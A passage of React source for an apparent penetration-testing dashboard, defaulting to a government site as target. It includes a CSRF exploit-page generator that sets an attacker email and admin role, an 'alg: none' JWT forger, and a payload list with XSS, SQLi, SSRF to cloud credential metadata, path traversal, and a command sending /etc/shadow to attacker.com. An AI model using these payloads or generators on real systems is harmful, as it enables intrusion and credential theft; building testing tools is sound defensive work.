import React, { useState, useEffect, useMemo } from 'react';
import CryptoJS from 'crypto-js';
import {
  Shield,
  Layers,
  Key,
  Globe,
  Code2,
  Copy,
  Check,
  Play,
  Download,
  AlertTriangle,
  FileCode,
  ExternalLink,
  Lock,
  Unlock,
  Terminal,
  Activity,
  Cpu,
  Search,
  Server,
  FileSearch,
  Hash,
  Sparkles,
  Zap,
  CheckCircle,
  XCircle,
  AlertOctagon,
  RefreshCw,
  Eye,
  Send,
  Database,
  Link,
  ShieldCheck,
  ShieldAlert,
  ArrowRightLeft,
  FileText,
  BookmarkPlus,
  Compass,
  Sliders,
  Maximize2,
  Minimize2,
  X,
  FileDown,
  Flame,
  ArrowRight,
  Filter,
  CheckCircle2,
  Code,
  MousePointer,
  HelpCircle,
  Plus,
  Trash2
} from 'lucide-react';
import api from '../services/api';
import '../styles/main.css';
import '../styles/tools.css';

// AES-128/256 PBKDF2 Utility
class AesUtil {
  constructor(keySize = 128, iterationCount = 1000) {
    this.keySize = keySize / 32;
    this.iterationCount = iterationCount;
  }

  generateKey(salt, passPhrase) {
    return CryptoJS.PBKDF2(passPhrase, CryptoJS.enc.Hex.parse(salt), {
      keySize: this.keySize,
      iterations: this.iterationCount
    });
  }

  encrypt(salt, iv, passPhrase, plainText) {
    const key = this.generateKey(salt, passPhrase);
    const encrypted = CryptoJS.AES.encrypt(plainText, key, {
      iv: CryptoJS.enc.Hex.parse(iv)
    });
    return encrypted.ciphertext.toString(CryptoJS.enc.Base64);
  }

  encode(salt, iv, passPhrase, plainText) {
    const cipherText = this.encrypt(salt, iv, passPhrase, plainText);
    return btoa(`${iv}::${salt}::${cipherText}`);
  }

  decrypt(salt, iv, passPhrase, cipherText) {
    const key = this.generateKey(salt, passPhrase);
    const cipherParams = CryptoJS.lib.CipherParams.create({
      ciphertext: CryptoJS.enc.Base64.parse(cipherText)
    });
    const decrypted = CryptoJS.AES.decrypt(cipherParams, key, {
      iv: CryptoJS.enc.Hex.parse(iv)
    });
    return decrypted.toString(CryptoJS.enc.Utf8);
  }

  decode(encryptedBase64, passPhrase) {
    try {
      const parts = atob(encryptedBase64).split('::');
      if (parts.length !== 3) throw new Error('Invalid format. Expected iv::salt::ciphertext');
      const [iv, salt, cipherText] = parts;
      const decrypted = this.decrypt(salt, iv, passPhrase, cipherText);
      if (!decrypted) throw new Error('Decryption resulted in empty text. Verify key/iterations.');
      return decrypted;
    } catch (e) {
      throw new Error(`Decryption failed: ${e.message}`);
    }
  }
}

export default function SecurityTools() {
  // 1. Projects & Scope Management
  const [projects, setProjects] = useState([]);
  const [selectedProjectId, setSelectedProjectId] = useState('CUSTOM');
  const [sharedUrl, setSharedUrl] = useState('https://bisag.gov.in');
  const [copiedKey, setCopiedKey] = useState(null);
  const [toastMessage, setToastMessage] = useState(null);

  // 2. 4-Stage VAPT Pipeline Navigation
  // Stages: 'phase1' (Recon), 'phase2' (Vuln Audit), 'phase3' (Active DAST), 'phase4' (Crypto/Lab)
  const [currentPhase, setCurrentPhase] = useState('phase1');
  const [activeSubTool, setActiveSubTool] = useState('ports'); // default tool in phase 1

  // 3. Automated Multi-Stage Orchestrator State
  const [isOrchestratorRunning, setIsOrchestratorRunning] = useState(false);
  const [orchestratorStage, setOrchestratorStage] = useState(0); // 0 to 5
  const [orchestratorLogs, setOrchestratorLogs] = useState('');
  const [accumulatedFindings, setAccumulatedFindings] = useState([]);
  const [aggressiveMode, setAggressiveMode] = useState(false);

  // 4. Live Cyber Console State
  const [runningToolId, setRunningToolId] = useState(null);
  const [consoleOpen, setConsoleOpen] = useState(false);
  const [consoleTab, setConsoleTab] = useState('logs'); // 'logs' | 'findings' | 'traffic' | 'summary'
  const [consoleFullscreen, setConsoleFullscreen] = useState(false);
  const [activeScanResult, setActiveScanResult] = useState(null);

  // Load Projects on Initial Mount
  useEffect(() => {
    const fetchProjects = async () => {
      try {
        const res = await api.get('/projects');
        if (res.data.success && Array.isArray(res.data.projects) && res.data.projects.length > 0) {
          setProjects(res.data.projects);
          const first = res.data.projects[0];
          setSelectedProjectId(String(first.id));
          if (first.target_url) setSharedUrl(first.target_url);
        }
      } catch (err) {
        console.error('Failed to load projects in Security Tools:', err);
      }
    };
    fetchProjects();
  }, []);

  // Handle Project Selection Switch
  const handleProjectSelect = (e) => {
    const val = e.target.value;
    setSelectedProjectId(val);
    if (val === 'CUSTOM') return;
    const proj = projects.find(p => String(p.id) === String(val));
    if (proj && proj.target_url) {
      setSharedUrl(proj.target_url);
      showToast(`✓ Scope auto-bound to Project: ${proj.project_name}`);
    }
  };

  const showToast = (msg) => {
    setToastMessage(msg);
    setTimeout(() => setToastMessage(null), 3500);
  };

  const copyToClipboard = (text, key) => {
    if (!text) return;
    navigator.clipboard.writeText(text);
    setCopiedKey(key);
    setTimeout(() => setCopiedKey(null), 2000);
    showToast('Copied to clipboard!');
  };

  const getHostname = (url) => {
    try {
      let u = url.trim();
      if (!u.startsWith('http://') && !u.startsWith('https://')) u = 'https://' + u;
      return new URL(u).hostname;
    } catch {
      return url.replace(/^https?:\/\//, '').split('/')[0].split(':')[0];
    }
  };

  const currentHost = getHostname(sharedUrl);

  // Direct Database Push for Single Finding
  const handlePushFindingToProject = async (finding) => {
    if (!selectedProjectId || selectedProjectId === 'CUSTOM') {
      showToast('⚠️ Please select an active Project from the top dropdown to sync to database.');
      return;
    }
    try {
      const res = await api.post(`/projects/${selectedProjectId}/findings`, {
        findings: [{
          vulnerability_name: finding.title || finding.name,
          description: finding.desc || finding.description || 'Discovered during active security tool assessment.',
          steps_to_reproduce: finding.evidence || `Executed on target ${sharedUrl}`,
          remediation: finding.remediation || 'Apply standard security controls and input sanitization.',
          severity: finding.severity || 'Medium',
          cwe_number: finding.cweNumber || finding.cwe_number || 'CWE-200',
          owasp_category: finding.owaspCategory || finding.owasp_category || 'A05:2021-Security Misconfiguration',
          status: 'Open'
        }]
      });
      if (res.data.success) {
        showToast(`✓ Finding "${finding.title || finding.name}" saved to Project Report in database!`);
      }
    } catch (err) {
      showToast(`Failed to sync finding: ${err.response?.data?.message || err.message}`);
    }
  };

  // Bulk Database Push for All Findings
  const handlePushAllFindingsToProject = async (findingsList) => {
    if (!findingsList || findingsList.length === 0) {
      showToast('No findings available to sync.');
      return;
    }
    if (!selectedProjectId || selectedProjectId === 'CUSTOM') {
      showToast('⚠️ Please select an active Project from the top dropdown to sync all findings.');
      return;
    }
    try {
      const formatted = findingsList.map(f => ({
        vulnerability_name: f.title || f.name,
        description: f.desc || f.description || 'Discovered during automated pipeline assessment.',
        steps_to_reproduce: f.evidence || `Executed during orchestrator audit on ${sharedUrl}`,
        remediation: f.remediation || 'Follow CERT-In / OWASP ASVS remediation standard.',
        severity: f.severity || 'Medium',
        cwe_number: f.cweNumber || f.cwe_number || 'CWE-200',
        owasp_category: f.owaspCategory || f.owasp_category || 'A05:2021-Security Misconfiguration',
        status: 'Open'
      }));

      const res = await api.post(`/projects/${selectedProjectId}/findings`, { findings: formatted });
      if (res.data.success) {
        showToast(`✓ Successfully synchronized ${findingsList.length} finding(s) to Project Report in database!`);
      }
    } catch (err) {
      showToast(`Failed to sync all findings: ${err.response?.data?.message || err.message}`);
    }
  };

  // Single Tool Execution Runner
  const runSingleTool = async (toolId, toolName) => {
    if (!sharedUrl.trim()) {
      showToast('Please specify a target URL first.');
      return;
    }

    setRunningToolId(toolId);
    setConsoleOpen(true);
    setConsoleTab('logs');

    try {
      const res = await api.post('/tools/run', {
        tool: toolId,
        target: sharedUrl,
        options: {
          aggressive: aggressiveMode,
          portProfile: 'top100'
        }
      });

      if (res.data.success) {
        setActiveScanResult({
          toolId,
          toolName,
          ...res.data
        });
        showToast(`✓ ${toolName} scan completed!`);
      }
    } catch (err) {
      showToast(`Error running ${toolName}: ${err.response?.data?.message || err.message}`);
    } finally {
      setRunningToolId(null);
    }
  };

  // Automated 5-Stage Orchestrator Runner
  const runAutomatedVaptPipeline = async () => {
    if (!sharedUrl.trim()) {
      showToast('Please specify a target URL first.');
      return;
    }

    setIsOrchestratorRunning(true);
    setOrchestratorLogs('');
    setAccumulatedFindings([]);
    setConsoleOpen(true);
    setConsoleTab('logs');
    setOrchestratorStage(1);

    const log = (msg) => {
      const ts = new Date().toLocaleTimeString();
      setOrchestratorLogs(prev => prev + `[${ts}] ${msg}\n`);
    };

    log(`🚀 INITIATING AUTOMATED TIER-1 VAPT PIPELINE FOR SCOPE: ${sharedUrl}`);
    log(`Mode: ${aggressiveMode ? 'AGGRESSIVE / DEEP AUDIT' : 'STANDARD PRODUCTION-SAFE'}`);
    log('----------------------------------------------------------------------');

    try {
      // Stage 1: Port Scanner & Banner Grab
      setOrchestratorStage(1);
      log('[STAGE 1/5] Executing TCP Port Scanning & Service Fingerprinting...');
      const portRes = await api.post('/tools/ports', { host: currentHost, portRange: 'top100', concurrency: 25 });
      const openPorts = portRes.data.openPorts || [];
      log(`  ✓ Open Ports Discovered (${openPorts.length}): ${openPorts.map(p => `#${p.port} (${p.service})`).join(', ') || 'None in top 100'}`);

      // Stage 2: DNS & Domain Recon
      setOrchestratorStage(2);
      log('[STAGE 2/5] Querying Multi-Record DNS Topology & Name Servers...');
      const dnsRes = await api.post('/tools/dns', { domain: currentHost, recordTypes: ['A', 'AAAA', 'MX', 'TXT', 'NS', 'CNAME'] });
      log(`  ✓ DNS Recon Complete: Found A records (${dnsRes.data.records?.A?.join(', ') || 'N/A'})`);

      // Stage 3: SSL & HTTP Security Headers
      setOrchestratorStage(3);
      log('[STAGE 3/5] Auditing SSL/TLS Cipher Suites and HTTP Security Headers...');
      const [sslRes, headerRes] = await Promise.all([
        api.post('/tools/ssl', { host: currentHost, port: 443 }).catch(e => ({ data: { error: e.message } })),
        api.post('/tools/headers', { url: sharedUrl }).catch(e => ({ data: { missing: [] } }))
      ]);

      const missingHeaders = headerRes.data?.missing || [];
      log(`  ✓ SSL Status: ${sslRes.data?.valid ? 'VALID CERTIFICATE (' + sslRes.data.daysRemaining + ' days left)' : 'INSPECTION COMPLETED'}`);
      log(`  ✓ Missing Security Headers: ${missingHeaders.length} identified.`);

      // Stage 4: Sensitive File Probing & Clickjacking/CORS
      setOrchestratorStage(4);
      log('[STAGE 4/5] Probing Exposed Environment Files, Clickjacking & CORS Policies...');
      const [filesRes, corsRes] = await Promise.all([
        api.post('/tools/sensitive-files', { url: sharedUrl }).catch(e => ({ data: { results: [] } })),
        api.post('/tools/cors', { url: sharedUrl }).catch(e => ({ data: { results: [] } }))
      ]);

      const exposedFiles = (filesRes.data?.results || []).filter(r => r.isExposed);
      const corsVulns = (corsRes.data?.results || []).filter(r => r.severity === 'CRITICAL' || r.severity === 'HIGH');
      
      const xFrameHeader = (headerRes.data?.present || []).find(h => h.name?.toLowerCase() === 'x-frame-options');
      const cspHeader = (headerRes.data?.present || []).find(h => h.name?.toLowerCase() === 'content-security-policy');
      const isClickjackable = !xFrameHeader && !(cspHeader && cspHeader.value?.toLowerCase().includes('frame-ancestors'));

      log(`  ✓ Exposed Sensitive Paths: ${exposedFiles.length} detected.`);
      log(`  ✓ CORS Insecurities: ${corsVulns.length} origin reflections found.`);
      log(`  ✓ Clickjacking Posture: ${isClickjackable ? 'VULNERABLE (Missing X-Frame-Options)' : 'PROTECTED'}`);

      // Aggregate Findings
      const findings = [];
      missingHeaders.forEach(m => {
        findings.push({
          title: `Missing Security Header: ${m.name}`,
          severity: 'LOW',
          owaspCategory: 'A05:2021-Security Misconfiguration',
          cweNumber: 'CWE-1021',
          desc: m.desc || 'Missing standard defense-in-depth header.',
          evidence: `Header ${m.name} was not present in HTTP response headers from ${sharedUrl}`,
          remediation: m.remediation || 'Configure web server to enforce this security header.'
        });
      });

      if (isClickjackable) {
        findings.push({
          title: 'Missing Anti-Clickjacking Frame Protection',
          severity: 'MEDIUM',
          owaspCategory: 'A05:2021-Security Misconfiguration',
          cweNumber: 'CWE-1021',
          desc: 'Target web application lacks X-Frame-Options and CSP frame-ancestors directives, allowing arbitrary third-party websites to frame the portal for UI redressing attacks.',
          evidence: `Evaluated headers on ${sharedUrl}: No X-Frame-Options or frame-ancestors directive present.`,
          remediation: "Configure X-Frame-Options: SAMEORIGIN or Content-Security-Policy: frame-ancestors 'self' in web server response headers."
        });
      }

      exposedFiles.forEach(f => {
        findings.push({
          title: `Publicly Accessible Sensitive File: ${f.path}`,
          severity: f.severity || 'HIGH',
          owaspCategory: 'A05:2021-Security Misconfiguration',
          cweNumber: 'CWE-538',
          desc: f.desc || `Direct HTTP access yielded status ${f.statusCode}`,
          evidence: `GET ${sharedUrl}${f.path} returned HTTP ${f.statusCode}`,
          remediation: 'Restrict access to configuration, git repositories, and backup files.'
        });
      });

      corsVulns.forEach(c => {
        findings.push({
          title: `Severe CORS Misconfiguration (${c.label})`,
          severity: c.severity,
          owaspCategory: 'A01:2021-Broken Access Control',
          cweNumber: 'CWE-942',
          desc: c.explanation,
          evidence: `Origin: ${c.origin} -> ACAO: ${c.acao}, ACAC: ${c.acac}`,
          remediation: 'Do not reflect untrusted origins with Access-Control-Allow-Credentials: true.'
        });
      });

      setAccumulatedFindings(findings);

      // Stage 5: Final Evaluation & Report Packaging
      setOrchestratorStage(5);
      log('----------------------------------------------------------------------');
      log(`🎯 AUDIT ORCHESTRATION COMPLETE! Identified ${findings.length} actionable vulnerabilities.`);
      log(`   • Critical/High: ${findings.filter(f => f.severity === 'CRITICAL' || f.severity === 'HIGH').length}`);
      log(`   • Medium/Low: ${findings.filter(f => f.severity === 'MEDIUM' || f.severity === 'LOW').length}`);
      log('   • Ready for database sync via "Push All Findings to DB" button.');

      showToast(`✓ Orchestrated VAPT Completed! Discovered ${findings.length} findings.`);
    } catch (err) {
      log(`❌ Pipeline halted with error: ${err.message}`);
      showToast(`Pipeline error: ${err.message}`);
    } finally {
      setIsOrchestratorRunning(false);
    }
  };

  // ==========================================
  // PHASE 1 SPECIFIC STATES & RUNNERS
  // ==========================================
  const [portScanTarget, setPortScanTarget] = useState(currentHost);
  const [portProfile, setPortProfile] = useState('top100');
  const [portScanning, setPortScanning] = useState(false);
  const [portResults, setPortResults] = useState(null);

  const [dnsDomain, setDnsDomain] = useState(currentHost);
  const [dnsScanning, setDnsScanning] = useState(false);
  const [dnsResults, setDnsResults] = useState(null);

  const [sslHost, setSslHost] = useState(currentHost);
  const [sslPort, setSslPort] = useState('443');
  const [sslScanning, setSslScanning] = useState(false);
  const [sslResults, setSslResults] = useState(null);

  useEffect(() => {
    setPortScanTarget(currentHost);
    setDnsDomain(currentHost);
    setSslHost(currentHost);
  }, [currentHost]);

  const runPortScan = async () => {
    if (!portScanTarget.trim()) return;
    setPortScanning(true);
    try {
      const res = await api.post('/tools/ports', { host: portScanTarget, portRange: portProfile, concurrency: 25 });
      setPortResults(res.data);
      showToast(`✓ Port scan complete! Discovered ${res.data.openPorts?.length || 0} open ports.`);
    } catch (err) {
      showToast(`Port scan error: ${err.message}`);
    } finally {
      setPortScanning(false);
    }
  };

  const runDnsRecon = async () => {
    if (!dnsDomain.trim()) return;
    setDnsScanning(true);
    try {
      const res = await api.post('/tools/dns', { domain: dnsDomain, recordTypes: ['A', 'AAAA', 'MX', 'TXT', 'NS', 'CNAME', 'SOA'] });
      setDnsResults(res.data);
      showToast(`✓ DNS Recon complete for ${dnsDomain}!`);
    } catch (err) {
      showToast(`DNS recon error: ${err.message}`);
    } finally {
      setDnsScanning(false);
    }
  };

  const runSslCheck = async () => {
    if (!sslHost.trim()) return;
    setSslScanning(true);
    try {
      const res = await api.post('/tools/ssl', { host: sslHost, port: sslPort });
      setSslResults(res.data);
      showToast(`✓ SSL Certificate verified for ${sslHost}!`);
    } catch (err) {
      showToast(`SSL inspection error: ${err.message}`);
    } finally {
      setSslScanning(false);
    }
  };

  // ==========================================
  // PHASE 2 SPECIFIC STATES & RUNNERS
  // ==========================================
  const [headerScanning, setHeaderScanning] = useState(false);
  const [headerResults, setHeaderResults] = useState(null);
  const [probeScanning, setProbeScanning] = useState(false);
  const [probeResults, setProbeResults] = useState(null);

  const runHeaderScan = async () => {
    if (!sharedUrl.trim()) return;
    setHeaderScanning(true);
    try {
      const res = await api.post('/tools/headers', { url: sharedUrl });
      setHeaderResults(res.data);
      showToast('✓ Security Headers Audit Completed!');
    } catch (err) {
      showToast(`Header scan error: ${err.message}`);
    } finally {
      setHeaderScanning(false);
    }
  };

  const runSensitiveProbes = async () => {
    if (!sharedUrl.trim()) return;
    setProbeScanning(true);
    try {
      const res = await api.post('/tools/sensitive-files', { url: sharedUrl });
      setProbeResults(res.data);
      showToast('✓ Sensitive file probing complete!');
    } catch (err) {
      showToast(`Probing error: ${err.message}`);
    } finally {
      setProbeScanning(false);
    }
  };

  // ==========================================
  // PHASE 3 ACTIVE DAST SPECIFIC STATES & RUNNERS
  // ==========================================
  const [corsTesting, setCorsTesting] = useState(false);
  const [corsResults, setCorsResults] = useState(null);

  const runCorsTest = async () => {
    if (!sharedUrl.trim()) return;
    setCorsTesting(true);
    try {
      const res = await api.post('/tools/cors', { url: sharedUrl });
      setCorsResults(res.data.results);
      showToast('✓ CORS Configuration Audit Completed!');
    } catch (err) {
      showToast(`CORS test error: ${err.message}`);
    } finally {
      setCorsTesting(false);
    }
  };

  // Clickjacking State
  const [clickjackTesting, setClickjackTesting] = useState(false);
  const [clickjackResult, setClickjackResult] = useState(null);
  const [clickjackOverlayOpacity, setClickjackOverlayOpacity] = useState(0.85);

  const runClickjackTest = async () => {
    if (!sharedUrl.trim()) return;
    setClickjackTesting(true);
    try {
      const res = await api.post('/tools/headers', { url: sharedUrl });
      const present = res.data?.present || [];
      const xFrame = present.find(h => h.name?.toLowerCase() === 'x-frame-options');
      const csp = present.find(h => h.name?.toLowerCase() === 'content-security-policy');
      
      const hasFrameAncestors = csp && csp.value?.toLowerCase().includes('frame-ancestors');
      const isProtected = !!(xFrame || hasFrameAncestors);
      
      setClickjackResult({
        url: sharedUrl,
        isProtected,
        xFrameValue: xFrame ? xFrame.value : 'MISSING',
        cspFrameAncestors: hasFrameAncestors ? 'CONFIGURED' : 'MISSING',
        verdict: isProtected ? 'PROTECTED' : 'VULNERABLE',
        severity: isProtected ? 'LOW' : 'MEDIUM',
        description: isProtected
          ? 'Target correctly sets anti-framing headers (X-Frame-Options or CSP frame-ancestors).'
          : 'Target application is missing X-Frame-Options and CSP frame-ancestors headers, allowing unauthorized framing inside malicious iframes (Clickjacking / UI Redressing).'
      });
      showToast(isProtected ? '✓ Anti-framing protection verified.' : '⚠️ Warning: Target is vulnerable to Clickjacking!');
    } catch (err) {
      showToast(`Clickjacking test error: ${err.message}`);
    } finally {
      setClickjackTesting(false);
    }
  };

  // CSRF PoC Exploit Studio State
  const [csrfActionUrl, setCsrfActionUrl] = useState('https://bisag.gov.in/api/user/update-profile');
  const [csrfMethod, setCsrfMethod] = useState('POST');
  const [csrfEnctype, setCsrfEnctype] = useState('application/x-www-form-urlencoded');
  const [csrfAutoSubmit, setCsrfAutoSubmit] = useState(true);
  const [csrfParams, setCsrfParams] = useState([
    { key: 'email', value: 'attacker@evilcorp.com' },
    { key: 'role', value: 'admin' },
    { key: 'confirm', value: 'true' }
  ]);

  useEffect(() => {
    if (sharedUrl) {
      setCsrfActionUrl(sharedUrl.replace(/\/$/, '') + '/api/user/update-profile');
    }
  }, [sharedUrl]);

  const addCsrfParam = () => setCsrfParams([...csrfParams, { key: '', value: '' }]);
  const removeCsrfParam = (idx) => setCsrfParams(csrfParams.filter((_, i) => i !== idx));
  const updateCsrfParam = (idx, field, val) => {
    const updated = [...csrfParams];
    updated[idx][field] = val;
    setCsrfParams(updated);
  };

  const generatedCsrfHtml = useMemo(() => {
    const inputs = csrfParams
      .filter(p => p.key.trim())
      .map(p => `      <input type="hidden" name="${p.key}" value="${p.value}" />`)
      .join('\n');
    
    return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>CSRF Proof-of-Concept Exploit</title>
</head>
<body style="font-family: sans-serif; background: #0b0f19; color: #fff; padding: 40px; text-align: center;">
  <h2>⚠️ Security PoC: Cross-Site Request Forgery (CSRF) Exploit</h2>
  <p>Target Action Endpoint: <code>${csrfActionUrl}</code> [Method: <strong>${csrfMethod}</strong>]</p>
  
  <form id="csrfPocForm" action="${csrfActionUrl}" method="${csrfMethod}" enctype="${csrfEnctype}">
${inputs}
    <noscript>
      <input type="submit" value="Click here if not redirected..." />
    </noscript>
  </form>

  ${csrfAutoSubmit ? `<script>
    // Automated Exploit Trigger
    console.log('[+] Executing automated CSRF trigger...');
    document.getElementById('csrfPocForm').submit();
  </script>` : `<button onclick="document.getElementById('csrfPocForm').submit()" style="padding: 10px 24px; background: #e11d48; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; margin-top: 15px;">
    Trigger Exploit Payload
  </button>`}
</body>
</html>`;
  }, [csrfActionUrl, csrfMethod, csrfEnctype, csrfAutoSubmit, csrfParams]);

  const downloadCsrfPoc = () => {
    const blob = new Blob([generatedCsrfHtml], { type: 'text/html' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'csrf_exploit_poc.html';
    a.click();
    URL.revokeObjectURL(url);
    showToast('✓ CSRF PoC Exploit downloaded as HTML file!');
  };

  // Payloads Workshop State
  const [payloadCategory, setPayloadCategory] = useState('ALL');
  const [payloadSearch, setPayloadSearch] = useState('');

  const samplePayloads = [
    { cat: 'XSS', name: 'Standard Image Payload', code: '<img src=x onerror=alert(document.domain)>', context: 'HTML injection' },
    { cat: 'XSS', name: 'SVG Onload Vector', code: '<svg onload=alert(1)>', context: 'WAF bypass' },
    { cat: 'XSS', name: 'JavaScript URI Scheme', code: 'javascript:alert(document.cookie)', context: 'HREF attribute' },
    { cat: 'SQLi', name: 'Classic Auth Bypass', code: "' OR 1=1 -- -", context: 'Login form' },
    { cat: 'SQLi', name: 'Time-Based Blind Sleep', code: "'; WAITFOR DELAY '0:0:5'--", context: 'MSSQL Blind' },
    { cat: 'SQLi', name: 'Union-Based Column Enumeration', code: "' UNION SELECT 1, @@version, user(), 4 -- -", context: 'MySQL Union' },
    { cat: 'SSRF', name: 'AWS EC2 Metadata Endpoint', code: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', context: 'Cloud SSRF' },
    { cat: 'SSRF', name: 'Localhost IPv6 Bypass', code: 'http://[::1]:80/', context: 'Internal Port probe' },
    { cat: 'LFI', name: 'Linux /etc/passwd Traversal', code: '../../../../../../../../etc/passwd', context: 'File inclusion' },
    { cat: 'LFI', name: 'Windows win.ini Traversal', code: '..\\..\\..\\..\\windows\\win.ini', context: 'Windows inclusion' },
    { cat: 'CMDi', name: 'Unix Command Chaining', code: '; cat /etc/shadow | curl -X POST -d @- http://attacker.com', context: 'Shell injection' },
    { cat: 'CMDi', name: 'Windows Whoami Chaining', code: '& whoami & dir', context: 'Windows Cmd' }
  ];

  const filteredPayloads = useMemo(() => {
    return samplePayloads.filter(p => {
      const matchCat = payloadCategory === 'ALL' || p.cat.toLowerCase() === payloadCategory.toLowerCase();
      const matchSearch = !payloadSearch || p.name.toLowerCase().includes(payloadSearch.toLowerCase()) || p.code.toLowerCase().includes(payloadSearch.toLowerCase());
      return matchCat && matchSearch;
    });
  }, [payloadCategory, payloadSearch]);

  // ==========================================
  // PHASE 4 CRYPTO & UTILITY STATES
  // ==========================================
  const sampleJwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkJJU0FHLU4gU2VjdXJpdHkgQW5hbHlzdCIsInJvbGUiOiJTZWN1cml0eSBBZG1pbiIsImFkbWluIjp0cnVlLCJpYXQiOjE1MTYyMzkwMjIsImV4cCI6MTk5OTk5OTk5OX0.4pe_smH6nUj8yT6XbJm7gVz5C4e9t9o0Y5bF6k8kK5A";
  const [jwtInput, setJwtInput] = useState(sampleJwt);
  const [jwtHeader, setJwtHeader] = useState(null);
  const [jwtPayload, setJwtPayload] = useState(null);
  const [jwtSignature, setJwtSignature] = useState('');
  const [jwtError, setJwtError] = useState(null);

  const parseJwt = (token) => {
    try {
      setJwtError(null);
      const parts = token.trim().split('.');
      if (parts.length < 2) {
        setJwtError('Invalid JWT format: Token must have at least 2 parts (Header.Payload.Signature).');
        return;
      }
      const headerObj = JSON.parse(atob(parts[0]));
      const payloadObj = JSON.parse(atob(parts[1]));
      setJwtHeader(headerObj);
      setJwtPayload(payloadObj);
      setJwtSignature(parts[2] || '');
    } catch (e) {
      setJwtError(`Parsing failed: ${e.message}`);
    }
  };

  useEffect(() => {
    parseJwt(jwtInput);
  }, [jwtInput]);

  const generateNoneAlgToken = () => {
    try {
      const parts = jwtInput.trim().split('.');
      const newHeader = { ...jwtHeader, alg: 'none' };
      const encodedHeader = btoa(JSON.stringify(newHeader)).replace(/=/g, '');
      const encodedPayload = parts[1];
      const bypassToken = `${encodedHeader}.${encodedPayload}.`;
      setJwtInput(bypassToken);
      showToast('✓ Generated "alg: none" bypass token (Empty Signature)!');
    } catch (e) {
      showToast('Failed to forge token: ' + e.message);
    }
  };

  // Dedicated AES PBKDF2 & Crypto Intruder Lab States
  const [aesPassphrase, setAesPassphrase] = useState('SecuritySecret123');
  const [aesKeySize, setAesKeySize] = useState(128);
  const [aesIterations, setAesIterations] = useState(1000);
  const [aesKeyHistory, setAesKeyHistory] = useState(['SecuritySecret123', 'AdminKey#2026', 'BisagSecretKey99']);
  const [aesPlainText, setAesPlainText] = useState('admin=true&role=SuperAdmin');
  const [aesEncryptedOutput, setAesEncryptedOutput] = useState('');
  const [aesCipherText, setAesCipherText] = useState('');
  const [aesDecryptedOutput, setAesDecryptedOutput] = useState('');

  // Crypto Intruder State
  const [intruderWordlist, setIntruderWordlist] = useState('admin\npassword123\nuser001\ntester_qa\nroot');
  const [intruderPrefix, setIntruderPrefix] = useState('user_');
  const [intruderMin, setIntruderMin] = useState(1);
  const [intruderMax, setIntruderMax] = useState(10);
  const [intruderSuffix, setIntruderSuffix] = useState('@corp.in');
  const [intruderRunning, setIntruderRunning] = useState(false);
  const [intruderProgress, setIntruderProgress] = useState(0);
  const [intruderResults, setIntruderResults] = useState('');
  const [intruderTokensCount, setIntruderTokensCount] = useState(0);

  const handleSaveKey = () => {
    const k = aesPassphrase.trim();
    if (!k) return;
    if (!aesKeyHistory.includes(k)) {
      setAesKeyHistory([...aesKeyHistory, k]);
      showToast('✓ Key saved to Key History dropdown!');
    }
  };

  const handleAesEncrypt = () => {
    try {
      if (!aesPlainText.trim()) {
        setAesEncryptedOutput('');
        return;
      }
      const aes = new AesUtil(aesKeySize, aesIterations);
      const iv = CryptoJS.lib.WordArray.random(128 / 8).toString(CryptoJS.enc.Hex);
      const salt = CryptoJS.lib.WordArray.random(128 / 8).toString(CryptoJS.enc.Hex);
      const enc = aes.encode(salt, iv, aesPassphrase, aesPlainText);
      setAesEncryptedOutput(enc);
    } catch (e) {
      setAesEncryptedOutput(`[Encryption Error]: ${e.message}`);
    }
  };

  const handleAesDecrypt = () => {
    try {
      if (!aesCipherText.trim()) {
        setAesDecryptedOutput('');
        return;
      }
      const aes = new AesUtil(aesKeySize, aesIterations);
      const dec = aes.decode(aesCipherText.trim(), aesPassphrase);
      setAesDecryptedOutput(dec);
    } catch (e) {
      setAesDecryptedOutput(`[Decryption Error]: ${e.message}`);
    }
  };

  const handleGenerateSequence = () => {
    const min = Math.max(1, parseInt(intruderMin, 10) || 1);
    const max = Math.min(1000, parseInt(intruderMax, 10) || 10);
    const list = [];
    for (let i = min; i <= max; i++) {
      list.push(`${intruderPrefix}${i}${intruderSuffix}`);
    }
    setIntruderWordlist(list.join('\n'));
    showToast(`✓ Generated ${list.length} sequential values into Wordlist!`);
  };

  const handleRunIntruder = async () => {
    const raw = intruderWordlist.split('\n').map(l => l.trim()).filter(Boolean);
    if (raw.length === 0) {
      showToast('Please enter or generate a wordlist first.');
      return;
    }
    setIntruderRunning(true);
    setIntruderProgress(0);
    const out = [];
    const aes = new AesUtil(aesKeySize, aesIterations);

    for (let i = 0; i < raw.length; i++) {
      const val = raw[i];
      try {
        const iv = CryptoJS.lib.WordArray.random(128 / 8).toString(CryptoJS.enc.Hex);
        const salt = CryptoJS.lib.WordArray.random(128 / 8).toString(CryptoJS.enc.Hex);
        out.push(aes.encode(salt, iv, aesPassphrase, val));
      } catch (e) {
        out.push(`[Error: ${e.message}]`);
      }
      if (i % 5 === 0 || i === raw.length - 1) {
        setIntruderProgress(Math.round(((i + 1) / raw.length) * 100));
        await new Promise(r => setTimeout(r, 10));
      }
    }

    setIntruderResults(out.join('\n'));
    setIntruderTokensCount(out.length);
    setIntruderRunning(false);
    showToast(`✓ Crypto Intruder finished! Generated ${out.length} encrypted token(s).`);
  };

  const downloadCorsPoc = (item) => {
    const withCreds = item.acac === 'true' || item.severity === 'CRITICAL';
    const html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>CORS Exploitation PoC</title>
  <style>
    body { font-family: Arial, sans-serif; margin: 40px; background: #0b0f19; color: #e2e8f0; }
    h2 { color: #f43f5e; }
    pre { background: #020617; padding: 14px; border-radius: 8px; white-space: pre-wrap; word-break: break-all; color: #10b981; border: 1px solid #1e293b; }
    button { background: #2563eb; color: #fff; border: none; padding: 10px 24px; border-radius: 6px; cursor: pointer; font-size: 14px; font-weight: bold; margin-top: 10px; }
    button:hover { background: #1d4ed8; }
    .info { background: #1e293b; border: 1px solid #334155; padding: 12px 16px; border-radius: 8px; font-size: 13px; margin-bottom: 16px; }
  </style>
</head>
<body>
  <h2>🚨 CORS Misconfiguration Proof of Concept</h2>
  <div class="info">
